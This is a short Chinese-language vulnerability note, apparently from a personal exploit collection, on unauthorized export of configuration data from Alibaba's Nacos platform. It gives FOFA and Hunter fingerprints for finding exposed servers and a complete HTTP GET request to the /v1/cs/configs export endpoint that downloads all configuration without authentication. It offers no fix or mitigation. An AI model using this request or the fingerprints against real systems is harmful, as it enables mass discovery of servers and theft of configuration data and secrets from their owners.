# Nacos存在未授权下载配置信息漏洞

一、漏洞简介

<font style="color:rgb(63, 63, 63);">Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。Nacos存在未授权下载配置信息漏洞 </font>

# <font style="color:rgb(51, 51, 51);">二、影响版本</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">Nacos </font>

# <font style="color:rgba(0, 0, 0, 0.9);">三、资产测绘</font>
+ hunter`app.name="Nacos"`
+ fofa `icon_hash="13942501"`
+ 特征

![1706098466504-aee1dd64-8194-4680-a095-f9ac7f516937.png](./img/RWufMeRanf6G5Rfy/1706098466504-aee1dd64-8194-4680-a095-f9ac7f516937-533247.png)

# 四、漏洞复现
```plain
GET /v1/cs/configs?export=true&group=&tenant=&appName=&ids=&dataId= HTTP/1.1
Host: 
If-Modified-Since: Wed, 03 Apr 2024 06:25:07 GMT
Priority: u=0, i
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
```

![1727070243107-46f80892-97ca-4e7c-a545-a85b1ea42e60.png](./img/RWufMeRanf6G5Rfy/1727070243107-46f80892-97ca-4e7c-a545-a85b1ea42e60-575442.png)![1727070251522-dba0dbcc-9311-4c06-954c-8b1fff3951a7.png](./img/RWufMeRanf6G5Rfy/1727070251522-dba0dbcc-9311-4c06-954c-8b1fff3951a7-884665.png)



> 更新: 2024-10-28 15:59:44  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ssg3fe6cnv42gbrw>